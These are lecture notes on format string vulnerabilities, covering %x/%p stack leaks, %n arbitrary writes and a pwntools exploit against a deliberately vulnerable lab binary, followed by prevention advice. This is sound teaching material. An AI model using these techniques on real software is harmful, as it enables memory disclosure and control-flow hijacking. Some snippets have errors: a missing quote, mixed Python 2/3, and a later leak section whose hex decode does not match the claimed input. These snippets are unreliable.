---
title: "Lecture Notes: Basics of Format String Vulnerabilities"
date: 2020-01-08 01:00:00
categories: notes lecture
layout: post
challenges: format0 format1 format2 format3 format4
---

In these notes, we introduce the concept of **format string vulnerabilities**
and describe how they can be used to both leak information from memory and
modify _arbitrary_ locations with _arbitrary_ values (i.e., a write-what-where
primitive). In short, string format vulnerabilities offer opportunities beyond
what is possible for a simple buffer overflow.

### What Happens When the Attacker Controls the Format String

One of the most common functions used in c is `printf`. In introductory Systems
courses we learn how to read input from a file or stdin, perform some string
manipulation, and display the result on the command line using `printf`. Most
of the time, you've used format specifiers---such as `%s` for strings, `%d` for
integers, and `%f` for floats---which are matched with some number of variables
to print the value of those variables. Note: the information below also applies
to other functions that use format strings, such as `sprintf` and `fprintf`.

However, when there are more format specifiers than variables things can go
wrong. In the worst case, such a mistake might allow an attacker to read from
or write into arbitrary memory locations.

Consider the following 32-bit C program.

```c
#include<stdio.h>

int main() {
  char buffer[64] = "%s %s";

  printf(buffer, "Hello", "World\n");
}
```

The output of this program is:

```
Hello World
```

The first argument passed to `printf` is the format string. In this example,
`buffer` is the format string and it specifies that `printf` should substitute
strings for the `%s` format specifiers; the specific strings are determined by
the second and third arguments passed to `printf`.

A quick look at the disassembly, and our prior knowledge of C calling
conventions, tells us what arguments are passed to `printf` and how.

```
0x080484aa <+63>:    push   0x8048560
0x080484af <+68>:    push   0x8048567
0x080484b4 <+73>:    lea    eax,[ebp-0x4c]
0x080484b7 <+76>:    push   eax
0x080484b8 <+77>:    call   0x8048330 <printf@plt>
```

In particular, the first two instructions push the third and second arguments
to `printf` to the stack, i.e., the addresses of the `"Hello"` and `"World\n"`
strings. Those strings are static values stored in the text section of the
virtual address space. The next two instructions setup and push the first
argument, i.e., the address of the `buffer` char array which contains the
format string.

One interesting property of `printf` is that it can be called with a variable
number of arguments. For example, we could have modified the call to only use
two arguments as follows:

```c
printf("%s", "Hello");
```

In other words, when `printf` executes, it does not immediately know how many
arguments were passed to the function. To determine how many arguments it was
passed, `printf` must parse the format string. But what happens when the
format string is wrong? For example, consider the following code:

```c
char buffer[64] = "%s %s";

printf(buffer);
```

In this program, `printf` is only passed a single argument: the address of the
string `%s %s`. The `printf` function will parse this string, see the format
specifiers calling for two additional strings to be printed, and look for the
addresses of those two strings on the stack. However, no such strings exist
and, consequently, `printf` will grab the four bytes from the stack from where
the string addresses should be placed and treat those as string addresses. Possibly,
`printf` will trigger a segmentation fault when those invalid pointers
are dereferenced.

Let's consider a slightly altered version of this program:

```c
char buffer[64] = "%x %x";

printf(buffer);
```

Like before, `printf` will look for the (missing) arguments on the stack, but
this time the format string contains a different pair of format specifiers,
`%x`. This specifier tells `printf` to print the hexadecimal representation of
the two arguments as if those arguments were unsigned integers.

Now let's switch over to thinking like an attacker. If an attacker can control
the format string passed to `printf`, change that format string to contain the
`%x` format specifier, then she can _force the program to print values from
stack memory._ While such memory leaks may seem of little consequence, these
leaks can provide the attacker with the information she needs to bypass
defenses like stack canaries and ASLR!

### Using Format Strings to Enable Arbitrary Writes

The format string problem extends beyond leaking memory. In particular,
`printf` has another interesting format specifier, `%n`, which _writes_ the
number of characters printed by `printf` prior to reaching the `%n` to an
address specified by the next argument. To make this behavior more concrete,
consider the following code:

```c
int value;

printf("what's my age again??? %n \n", &value);
printf(value = %d\n", value)
```

The output of this is:

```c
what's my age again???
value = 23
```

The value of 23 is number of characters preceding the `%n` in the string
`what's my age again??? %n \n`. Keep in mind that `%n` records the number of
characters printed to the screen, not necessarily the number of characters in
the format string itself. Other `printf` formatting features can influence the
number of characters printed to the screen.

In the previous example we provided the address of the `value` variable, but
what if the programmer forgot to include this argument? For example:

```c
printf("what's my age again??? %n \n");
```

This is essentially the same scenario we discussed previously with our strings
example: `printf` will parse the format string, see the `%n`, interpret the
word at the appropriate location on the stack as the address argument, try to
write to the location specified by this address, and most likely trigger a
segmentation fault.

At this point you might be thinking: "Hmmm, if I can control the format string
argument to `printf`, and I can leverage that ability to also control how many
characters are written via `printf`. Consequently, I can write an arbitrary
value via `%n`. Further, if I can control values on the stack, then I can
control the address written to by `%n`. In short, I have a write-what-where
primitive." If you were thinking this, then you would be correct. A
write-what-where vulnerability can be very powerful for the attacker, e.g., she
can hijack the control-flow by targeting entries in the global offset table.

### Simple Example

Consider how we might exploit a binary with the following C code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *s) {
  printf(s);

  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv) {
  vuln(argv[1]);
}

```

Let's try to apply some of the knowledge we gained from above. Let's focus on
the line `printf(s)` in function `vuln()`. The `s` argument is a
value that we (as the attacker) control. Further, because it is the first
argument to `printf`, `s` is treated as a format string by `printf`. In
short, this looks like a format string vulnerability.

To confirm, let's write out a pwntools script that provides the binary with a
format string that prints out values on the stack:

```python
from pwn import *

context.clear(arch="i386")

p = process("./vuln")
p.sendline('aaaa' + ' %x'*15)
p.interactive()
```

We should see output similar to the following:

```
aaaa 40 f7fc25a0 0 f7ffd000 f7ffd918 ffffd280 ffffd374 0 ffffd314 f7fc2000 61616161 20782520 25207825 78252078 20782520
```

We can take the end of this sequence of hex characters and write code to
interpret these values as ascii as follows:

```python
from pwn import *

print unhex("61616161 20782520 25207825 78252078 20782520".replace(' ',''))
```

When run, this code will give us:

```
aaaa x% % x%x% x x%
```

If we account for transposition due to alignment and endianness (remember that
we are telling `printf` to treat successive sets of four bytes as unsigned
integers), this string looks like part of our input. In other words, we
managed to leak enough memory to find our own input string on the stack!
Specifically, the 11th `%x` specifier printed out the start of our input
string.

Let's clean this code up just a bit, using some additional features of `printf`, to only
print out the first four bytes of our input string:

```python
p = process("./vuln")
p.sendline('aaaa' + ' %11$x')
p.interactive()
```

If we change the `%11$x` to `%11$n`, `printf` will attempt to write to the
number of printed characters to the address 0x61616161, i.e., `aaaa`.

At this point, we know:

1.  this program has a format string vulnerability,
2.  we have control over the format string, and
3.  we can control some values on the stack.

If we use "%n" as part of our input and are clever in how we construct our
format string, then we can directly control where on the stack `printf` looks
for the `%n` address argument. That is, we can control the address of the write.
For this challenge, we want to change the value of the global variable `target`
and, thus, we want our `%n` to trigger a write to `target`. Fortunately, we do
not need to worry about what value gets written there (as long as it is not
zero).

There are many ways to figure out the address of `target`---for example
`objdump -t binary | grep target`---but let's use another pwntools feature to
help us.

Putting it all together, we have the following solution:

```python
b=ELF("./vuln")

log.info("target at: " + hex(b.symbols.target))

exploit_str = pack(b.symbols.target) + ' %11$n'

p = process("./vuln")
p.sendline(exploit_str)
p.interactive()
```

## Format Strings as Information Leaks

Format string vulnerabilities aren't just useful for writing to arbitrary memory locations - they're also powerful tools for information leaks, which can be critical for defeating ASLR and building ROP chains.

### Systematic Stack Leaking

When exploiting a format string vulnerability, one of the first steps should be systematically leaking values from the stack. Instead of using a crude approach like `%x %x %x %x`, we can use the direct parameter access feature of format strings:

```python
from pwn import *

# Create a systematic function to leak values
def leak_params(count=15):
    values = []
    for i in range(1, count+1):
        p = process('./format_vuln')  # Start a new process each time
        p.sendline(f'%{i}$p')         # Request the i-th parameter
        p.recvuntil('You said: ')
        value = p.recvline().strip()
        values.append(value)
        p.close()
    return values

# Print the leaked values with their parameter numbers
leaked = leak_params()
for i, val in enumerate(leaked, 1):
    print(f"Parameter {i}: {val}")
```

This approach gives us a clean view of what printf sees as its parameters:

1. Early parameters (1-6 in x86_64) typically come from registers (RDI, RSI, RDX, etc.)
2. Later parameters come from the stack

### Identifying Valuable Information

From these leaks, we can often find:

1. **Stack addresses**: Recognizable by patterns like `0x7fff...`
2. **Libc addresses**: Often starting with `0x7f...` but not `0x7fff...`
3. **Program/text addresses**: If PIE is disabled, these start with `0x40...` (64-bit) or `0x08...` (32-bit)
4. **Our input buffer**: Identifiable by converting the hex values to ASCII
5. **Canary values**: Usually ending in `00` (null byte)
6. **Return addresses**: Pointing into the program's code

### Locating Your Input Buffer

Finding where your input begins is particularly important:

```
Parameter 6: 0x702436246c
```

Converting this to ASCII (accounting for little-endian representation):

```
0x70 = 'p'
0x24 = '$'
0x36 = '6'
0x24 = '$'
0x6c = 'l'
```

This looks like part of our format string `%6$p` (backwards due to little-endian), indicating parameter 6 points to our input buffer.

### From Leaks to Exploitation

Once you've identified where important values are located relative to your buffer, you can:

1. Calculate offsets between your buffer and target values (return address, canary)
2. For a ROP chain, use leaked libc addresses to defeat ASLR
3. For buffer overflows, use precise knowledge of stack layout to craft your exploit

This systematic approach to format string exploitation is far more reliable than guessing or using the traditional "spray and pray" method with many format specifiers.

### Preventing Format String Vulnerabilities

The simplest approach to avoiding this type of attack is to pass your own
static format string to `printf`. For example, instead of `printf(user_input)`
it is safer to use `printf("%s", user_input)`. Here, if an attacker passes
format characters as their input `printf` will simply interpret read
it as a string literal---no sensitive information will be leaked and no
values on the stack are overwritten.

Modern compilers will often warn of usage format string usage, so be sure to
heed the warnings!

### Illustrating the Behavior of %n

The following code snippet, which you should run yourself, illustrates some
of the behaviors of the `%n` format specifier that often confuse students.

```c
#include<stdio.h>

int main() {
  int count = 0;

  // Count will be 4
  printf("abcd%n", &count);
  printf("\nCount: %d %x\n", count, count);

  // Count should be 4 after this call, as the %n does not
  // count characters from previous calls to printf
  printf("abcd%n", &count);
  printf("\nCount: %d %x\n", count, count);

  //Count 5 because len("hello") is five
  printf("%s%n", "Hello", &count);
  printf("\nCount: %d %x\n", count, count);

  // Count 256, padded with spaces
  printf("%256s%n", "Hello", &count);
  printf("\nCount: %d %x\n", count, count);

  // Count 0, hex(256) == 0x0100
  count = 0;
  printf("%256s%hhn", "Hello", (char *)&count);
  printf("\nCount: %d %x\n", count, count);

  // Count 0, hex(256) == 0x0100
  // These lines behave the same as the example above,
  // but gcc will throw up warnings
  //count = 0;
  //printf("%256s%hhn", "Hello", &count);
  //printf("\nCount: %d %x\n", count, count);

  // Count: 16776960 ffff00
  count = 0xffffff;
  printf("%256s%hhn", "Hello", (char *)&count);
  printf("\nCount: %d %x\n", count, count);

  // Count: 16711935 ff00ff
  count = 0xffffff;
  printf("%256s%hhn", "Hello", (char *)&count + 1);
  printf("\nCount: %d %x\n", count, count);
}
```

### Other Resources on the Topic

For more information about format strings and associated attacks, consider taking a look at the following link(s).

1. https://stackoverflow.com/questions/18681078/in-which-memory-segment-command-line-arguments-get-stored
